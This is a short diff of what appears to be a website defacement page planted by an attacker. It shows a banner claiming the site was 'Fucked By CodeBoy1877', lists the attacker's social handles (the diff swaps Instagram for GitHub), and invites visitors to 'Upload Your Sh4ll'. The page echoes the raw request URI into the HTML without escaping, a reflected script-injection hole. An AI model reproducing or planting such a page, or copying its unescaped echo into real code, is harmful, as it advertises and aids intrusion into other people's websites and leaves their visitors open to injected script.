@@ -5,8 +5,8 @@
 	<center>
 <h1>Fucked By CodeBoy1877</h1>
 <h2>Telegram : CodeBoy1877x</h2>
+<h2>Github : CodeBoy1877</h2>
 <h2>Twitter : CodeBoy1877</h2>
-<h2>Instagram : CodeBoy1877</h2>
 <p>Upload Your Sh4ll <?php echo $_SERVER['REQUEST_URI'];
  ?> And Enjoy it.</p>
  </center>
